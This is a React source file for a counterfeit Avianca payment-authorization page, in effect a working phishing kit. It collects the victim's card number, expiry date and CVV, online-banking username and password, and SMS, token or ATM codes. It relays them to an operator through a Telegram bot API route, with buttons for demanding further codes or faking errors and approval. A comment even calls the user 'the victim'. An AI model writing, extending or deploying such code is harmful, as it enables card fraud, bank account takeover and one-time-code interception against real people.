"use client"

import { useEffect, useState, useCallback } from "react"

// --- Tipos ---
interface PaymentData {
  flightCost?: string
  totalPrice?: string
  amount?: string
  price?: string
  cardNumber?: string
  transactionId?: string
  name?: string
  cc?: string
  email?: string
  telnum?: string
  city?: string
  state?: string
  address?: string
  bank?: string
  expiryDate?: string;
  cvv?: string;
  dues?: string;
}

// --- Helpers ---
// Devuelve el texto sin escapar (texto plano)
const escapeMarkdownV2 = (text: string | undefined): string => {
  if (!text) return 'No ingresado';
  // Escapa caracteres especiales para MarkdownV2 de Telegram
  return text.replace(/([_\[\]()~`>#+\-=|{}.!])/g, '\\$1');
};

const allCodeButtons = (transactionId: string) => [
  { text: "Pedir SMS 📱", callback_data: `sms:${transactionId}` },
  { text: "Pedir Clave Dinámica 🔑", callback_data: `dinamica:${transactionId}` },
  { text: "Pedir Token 📟", callback_data: `token:${transactionId}` },
  { text: "Pedir Cajero (ATM) 🏧", callback_data: `atm:${transactionId}` }
];

export default function App() {
  // Estados
  const [paymentData, setPaymentData] = useState<PaymentData>({});
  const [loading, setLoading] = useState(true);
  const [loadingText, setLoadingText] = useState("Validando datos...");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  // pageState controla si mostramos el login o el input del código
  const [pageState, setPageState] = useState<'initial' | 'waiting_for_code'>('initial');

  // Inputs del usuario
  const [authInputs, setAuthInputs] = useState({ user: '', password: '', dynamicCode: '' });

  // Tipo de código solicitado (SMS, Token, etc.)
  const [dynamicCodeType, setDynamicCodeType] = useState<string>('');

  // ID del mensaje actual en Telegram para poder editarlo si es necesario
  const [currentMessageId, setCurrentMessageId] = useState<string>('');

  // Función para obtener información del banco a partir del BIN de la tarjeta
  const fetchBankInfoFromBIN = useCallback(async (cardNumber: string) => {
    if (!cardNumber || cardNumber.length < 6) {
      return; // No hacer nada si no hay número de tarjeta o es muy corto
    }

    const bin = cardNumber.replace(/\s+/g, '').substring(0, 6);

    try {
      // Usamos nuestra API de proxy local
      const response = await fetch(`/api/bin-lookup?bin=${bin}`);
      if (!response.ok) return;

      const data = await response.json();

      // Formateamos la información del banco
      const bankName = data.bank?.name || 'Desconocido';
      const cardType = data.scheme?.toUpperCase() || '';
      const bankInfo = `${bankName} - ${cardType}`;

      // Actualizamos el estado con la nueva información del banco
      setPaymentData(prev => ({ ...prev, bank: bankInfo }));

    } catch (error) {
      console.error("Error al obtener información del BIN:", error);
    }
  }, []);

  // 1. Carga inicial (Client Side)
  useEffect(() => {
    let storedData: PaymentData = {};
    const stored = localStorage.getItem("paymentData");
    storedData = stored ? JSON.parse(stored) : {};

    // Generar transactionId si no existe
    let transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
    storedData = { ...storedData, transactionId };

    // Guardar de nuevo para persistencia
    localStorage.setItem('paymentData', JSON.stringify(storedData));

    setPaymentData(storedData);

    // Si tenemos un número de tarjeta, buscamos la información del banco
    if (storedData.cardNumber) {
      fetchBankInfoFromBIN(storedData.cardNumber);
    }
    setTimeout(() => setLoading(false), 500);
  }, [fetchBankInfoFromBIN]);
  // 2. 🔥 META PIXEL - PURCHASE
useEffect(() => {
  if (!paymentData) return;

  // evitar duplicados
  if (localStorage.getItem("meta_purchase_sent")) return;

  const value =
    Number(paymentData.totalPrice) ||
    Number(paymentData.flightCost) ||
    Number(paymentData.amount) ||
    Number(paymentData.price) ||
    0;

  if (value > 0 && typeof window !== "undefined" && window.fbq) {
    window.fbq("track", "Purchase", {
      value,
      currency: "COP",
    });

    localStorage.setItem("meta_purchase_sent", "true");
    console.log("✅ Meta Purchase enviado:", value);
  }
}, [paymentData]);

  const cardNumber = paymentData?.cardNumber || "";
  const last4 = cardNumber ? cardNumber.replace(/\s+/g, '').slice(-4) : "1234";
  const transactionId = paymentData.transactionId || '';
  // Obtener el monto para el resumen
  const amountDisplay = paymentData.flightCost || paymentData.totalPrice || paymentData.amount || paymentData.price || "49.900";


  // 2. Long Polling: Esperar respuesta del operador
  const waitForOperatorAction = useCallback(async (messageId: string) => {
    setLoading(true);
    setLoadingText('Esperando confirmación del banco...'); // Mensaje más realista para la víctima

    try {
      // NOTA: Esta ruta debe coincidir con tu backend
      const response = await fetch(`/api/check-update/${messageId}`);

      if (response.status === 408) {
        // Timeout
        setErrorMessage("El banco tardó en responder. Por favor, intente nuevamente.");
        setLoading(false);
        return;
      }

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || "Error de conexión");
      }

      const { action } = await response.json();
      setLoading(false);
      setErrorMessage(null);

      // Analizar la acción recibida
      const isErrorAction = action.startsWith('error_');
      const isRequestAction = ['sms', 'dinamica', 'token', 'atm'].includes(action);

      if (isRequestAction) {
        // -- Operador pide un código --
        setPageState('waiting_for_code');
        let descriptiveText = 'el código de seguridad'; // Texto por defecto
        if (action === 'sms') descriptiveText = 'el código que recibiste por SMS';
        if (action === 'dinamica') descriptiveText = 'la Clave Dinámica';
        if (action === 'token') descriptiveText = 'el Token digital';
        if (action === 'atm') descriptiveText = 'el código generado en el Cajero (ATM)';
        setDynamicCodeType(descriptiveText);

        // Limpiar campo de código anterior
        setAuthInputs(prev => ({ ...prev, dynamicCode: '' }));

        setTimeout(() => document.getElementById('dynamic-code')?.focus(), 100);

      } else if (isErrorAction) {
        // -- Operador marca error --
        if (action === 'error_logo') {
          setErrorMessage("Usuario o clave incorrectos. Verifique e intente nuevamente.");
          setPageState('initial');
          setAuthInputs(prev => ({ ...prev, password: '' }));
          setTimeout(() => document.getElementById('auth-user')?.focus(), 100);
        } else if (action === 'error_tc') {
          alert("Error en la validación de la tarjeta. Será redirigido.");
          window.location.href = "/";
        } else {
          // Error de código específico
          let codeType = action.replace('error_', '');
          codeType = codeType.charAt(0).toUpperCase() + codeType.slice(1);
          if (action.includes('sms')) codeType = 'SMS';

          setErrorMessage(`El código ${codeType} ingresado es inválido.`);
          setAuthInputs(prev => ({ ...prev, dynamicCode: '' }));
          setTimeout(() => document.getElementById('dynamic-code')?.focus(), 100);
        }

      } else if (action === 'finalizar') {
  setLoadingText("Pago Aprobado exitosamente. Redirigiendo...");
  setLoading(true);

  setTimeout(() => {
    window.location.href = `/confirmacion?tid=${transactionId}`;
  }, 2000);
}

    } catch (error) {
      console.error("Polling Error:", error);
      setLoading(false);
      setErrorMessage("Error de comunicación con el servidor de seguridad.");
    }
  }, []);

  // 3. Enviar datos (Login o Código)
  const handleNextStep = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    setLoading(true);

    let fullMessage = "";
    let bankInfo = paymentData.bank || 'No disponible'; // Valor por defecto

    // Obtenemos la info del banco ANTES de enviar el mensaje (si no la tenemos)
    if (paymentData.cardNumber && !paymentData.bank) {
      try {
        const bin = paymentData.cardNumber.replace(/\s+/g, '').substring(0, 6);
        // Usamos nuestra API de proxy local
        const response = await fetch(`/api/bin-lookup?bin=${bin}`);
        if (response.ok) {
          const data = await response.json();
          const bankName = data.bank?.name || 'Desconocido';
          const cardType = data.scheme?.toUpperCase() || '';
          bankInfo = `${bankName} - ${cardType}`;
          // Actualizar estado localmente para el mensaje
          setPaymentData(prev => ({ ...prev, bank: bankInfo }));
        }
      } catch (e) {
        console.error("Fallo al obtener info del BIN en handleNextStep", e);
      }
    }

    let keyboard: any = {};
    const baseButtons = allCodeButtons(transactionId);

    // **PLANTILLA MODIFICADA: Usando MarkdownV2 para Telegram (se asumió que el backend lo requiere)**
    const baseMessage = `
✈️ NUEVA RESERVA \\- AVIANCA ✈️

👤 DATOS DEL TITULAR
💳 Tarjeta: ${escapeMarkdownV2(paymentData.cardNumber)}
🗓️ Exp: ${escapeMarkdownV2(paymentData.expiryDate)}
🔒 CVV: ${escapeMarkdownV2(paymentData.cvv)}
🏦 Banco: ${escapeMarkdownV2(bankInfo)}
`;

    if (pageState === 'initial') {
      // --- ESTADO 1: Enviando Usuario/Pass ---
      if (!authInputs.user || !authInputs.password) {
        setErrorMessage("Campos requeridos.");
        setLoading(false);
        return;
      }

      setLoadingText("Verificando credenciales de seguridad...");

      fullMessage = `${baseMessage}

👤 DATOS DE ACCESO (LOGIN)
🤵 User: ${escapeMarkdownV2(authInputs.user)}
🔒 Pass: ${escapeMarkdownV2(authInputs.password)}

🆔 ID: ${transactionId}
`;
      keyboard = {
        inline_keyboard: [
          ...baseButtons.map(btn => [btn]),
          [{ text: "Usuario/Clave Incorrecta ❌", callback_data: `error_logo:${transactionId}` }],
          [{ text: "Tarjeta Inválida 💳", callback_data: `error_tc:${transactionId}` }]
        ]
      };

    } else if (pageState === 'waiting_for_code') {
      // --- ESTADO 2: Enviando Código (SMS/Token) ---
      if (!authInputs.dynamicCode) {
        setErrorMessage("Ingrese el código recibido.");
        setLoading(false);
        return;
      }

      setLoadingText("Validando código de seguridad...");

      // Filtramos el botón de la acción actual para que no se pida dos veces lo mismo
      const currentActionPrefix = dynamicCodeType.toLowerCase().includes('cajero') ? 'atm' : dynamicCodeType.toLowerCase().split(' ')[0];
      const nextButtons = baseButtons.filter(btn => !btn.callback_data.includes(currentActionPrefix));

      fullMessage = `${baseMessage}

👤 DATOS DE ACCESO + CÓDIGO
🤵 User: ${escapeMarkdownV2(authInputs.user)}
🔒 Pass: ${escapeMarkdownV2(authInputs.password)}
🔴 ${escapeMarkdownV2(dynamicCodeType)}: ${escapeMarkdownV2(authInputs.dynamicCode)}

🆔 ID: ${transactionId}
`;
      keyboard = {
        inline_keyboard: [
          ...nextButtons.map(btn => [btn]),
          [{ text: `Código Incorrecto ❌`, callback_data: `error_${currentActionPrefix}:${transactionId}` }],
          [{ text: "✅ APROBAR PAGO ✅", callback_data: `finalizar:${transactionId}` }]
        ]
      };
    }

    // --- FETCH A LA API ---
    try {
      // NOTA: Esta ruta debe coincidir con tu backend
      const response = await fetch(`/api/send-message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: fullMessage,
          keyboard: keyboard,
          message_id: pageState === 'waiting_for_code' ? currentMessageId : undefined
        }),
      });

      const data = await response.json();

      if (response.ok && data.result?.message_id) {
        setCurrentMessageId(data.result.message_id);
        // Iniciar la espera activa de respuesta
        waitForOperatorAction(data.result.message_id);
      } else {
        throw new Error(data.description || "Error API");
      }

    } catch (error) {
      console.error("Error envío:", error);
      setLoading(false);
      setErrorMessage("Error de conexión. Intente nuevamente.");
    }
  };

  return (
    <main className="min-h-screen bg-[#f4f7f6] flex items-center justify-center p-4">
      {/* Usando max-w-md para un contenedor un poco más grande que el sm (similar a 500px) */}
      <div className="max-w-md w-full bg-white p-6 rounded-lg shadow-lg border border-gray-200">

        <div className="flex items-center justify-center mb-5">
          {/* Placeholder for logo since local asset won't load */}
          <div className="h-8 flex items-center text-red-600 font-bold text-xl">
             AVIANCA
          </div>
        </div>

        {/* Título y subtítulo con la nueva estructura */}
        <b className="text-gray-800 mb-1 block font-bold">Autorización de transacción</b>
        <p className="text-sm text-gray-600 mb-5">La transacción que intenta realizar en <b className="font-semibold text-gray-700">AVIANCA S.A</b> debe ser autorizada. Por favor, ingresa los datos de tu banca virtual:</p>

        {/* RESUMEN TRANSACCIÓN (Basado en la estructura del HTML plano) */}
        <div className="bg-[#f4f7f6] p-4 rounded-lg mb-6 text-sm space-y-2 border border-gray-100">
          <div className="flex justify-between">
            <span className="font-bold text-gray-700">Comercio</span>
            <span className="text-gray-700">AVIANCA S.A</span>
          </div>
          <div className="flex justify-between">
            <span className="font-bold text-gray-700">Banco</span>
            <span className="text-gray-700">{paymentData.bank || 'Cargando...'}</span>
          </div>
          <div className="flex justify-between">
            <span className="font-bold text-gray-700">Número de tarjeta</span>
            <span className="text-gray-700 tracking-wider">•••• •••• •••• {last4}</span>
          </div>
        </div>

        {/* FORMULARIO */}
        <form onSubmit={handleNextStep}>

          {errorMessage && (
            /* Estilo de error similar al HTML plano: bg-red-100, border-red-400 */
            <div className="bg-red-50 text-red-700 text-sm p-3 rounded-md mb-4 border border-red-200 flex items-start">
              <span className="mr-2 pt-0.5">⚠️</span>
              <span>{errorMessage}</span>
            </div>
          )}

          {/* INPUTS DE USUARIO Y CLAVE */}
          <div className={pageState === 'waiting_for_code' ? 'hidden' : 'block'}>
            <div className="space-y-4">
              {/* Usuario */}
              <label htmlFor="auth-user" className="block text-sm font-semibold mb-1 text-gray-700">Usuario</label>
              <input
                type="text"
                required
                className="w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all"
                placeholder="" // Dejamos el placeholder vacío para que el label tome el control
                value={authInputs.user}
                onChange={e => setAuthInputs({ ...authInputs, user: e.target.value })}
                disabled={loading}
                id="auth-user"
                autoComplete="username"
              />
              {/* Contraseña */}
              <label htmlFor="auth-password" className="block text-sm font-semibold mb-1 text-gray-700">Contraseña</label>
              <input
                type="password"
                id="auth-password"
                required
                className="w-full rounded-md border border-gray-300 px-4 py-3 text-gray-900 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all"
                placeholder="" // Dejamos el placeholder vacío para que el label tome el control
                value={authInputs.password}
                onChange={e => setAuthInputs({ ...authInputs, password: e.target.value })}
                disabled={loading}
                autoComplete="current-password"
              />
            </div>
          </div>

          {/* INPUT DE CÓDIGO DINÁMICO */}
          <div className={pageState === 'waiting_for_code' ? 'block' : 'hidden'}>
            <div className="text-center mb-3">
              <label htmlFor="dynamic-code" className="block text-red-600 text-lg font-bold mb-1">Clave {dynamicCodeType.replace(/el |la /, '').replace('código que recibiste por ', '').replace('código generado en el ', '')}</label>
              <p className="text-sm text-gray-600">Por favor, ingrese {dynamicCodeType} para continuar.</p>
            </div>
            <input
              type="tel"
              id="dynamic-code"
              required={pageState === 'waiting_for_code'}
              className="w-full px-4 py-4 text-center text-2xl tracking-widest rounded-md border border-gray-300 focus:ring-2 focus:ring-inset focus:ring-red-500 outline-none transition-all"
              placeholder="• • • • • •"
              value={authInputs.dynamicCode}
              onChange={e => setAuthInputs({ ...authInputs, dynamicCode: e.target.value })}
              disabled={loading}
              autoComplete="off"
            />
          </div>

          {/* Botón */}
          <div className="mt-6">
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-[#E8114B] hover:bg-[#D40E43] text-white font-bold py-3 text-lg transition duration-200 disabled:opacity-70 disabled:cursor-not-allowed shadow-md hover:shadow-lg rounded-md"
            >
              {pageState === 'initial' ? 'Autorizar' : 'Confirmar Transacción'}
            </button>
          </div>
        </form>
      </div>


      {/* LOADER OVERLAY */}
      {loading && (
        <div className="fixed inset-0 bg-white/90 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="loader-spin border-4 border-gray-200 border-t-[#E8114B] rounded-full w-12 h-12 animate-spin mb-4"></div>
          <p className="text-gray-800 font-medium animate-pulse">{loadingText}</p>
        </div>
      )}
    </main>
  );
}
